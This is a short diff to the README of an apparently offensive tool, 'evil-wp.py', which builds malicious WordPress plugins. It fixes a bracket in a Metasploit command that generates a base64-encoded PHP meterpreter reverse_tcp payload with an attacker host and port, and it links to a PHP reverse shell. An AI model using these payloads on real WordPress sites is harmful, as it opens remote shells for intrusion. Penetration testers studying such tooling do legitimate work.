@@ -31,7 +31,7 @@ $ python evil-wp.py -n <plugin_name> -p "<payload>"
 msfvenom is a great place to start with for generating PHP payloads.
 
 ``` bash
-$ msfconsole -p php/meterpreter/reverse_tcp LHOST=<attacker_host LPORT=<listening_port> -e php/base64 -f raw
+$ msfconsole -p php/meterpreter/reverse_tcp LHOST=<attacker_host> LPORT=<listening_port> -e php/base64 -f raw
 ```
 
 Any valid PHP will work, including traditional PHP reverse shell payloads such as this one: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.
